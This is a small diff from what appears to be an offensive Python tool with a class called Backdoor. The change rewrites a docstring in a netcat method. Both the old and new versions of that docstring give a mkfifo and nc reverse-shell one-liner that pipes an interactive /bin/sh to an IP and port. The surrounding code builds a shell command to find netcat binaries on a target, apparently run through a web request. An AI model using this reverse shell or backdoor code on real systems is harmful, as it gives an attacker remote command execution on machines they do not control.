@@ -52,9 +52,8 @@ class Backdoor(object):
 
     def netcat(self, ip, port):
         '''
-        nc openbsd deosn't have -e switch
-        alternative solution:
-            rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
+        nc.OpenBSD deosn't have -e switch. Alternative solution:
+            rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT>/tmp/f
         '''
         cmd = "for x in `whereis nc netcat`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         netcat = make_request.get_page_source(cmd)
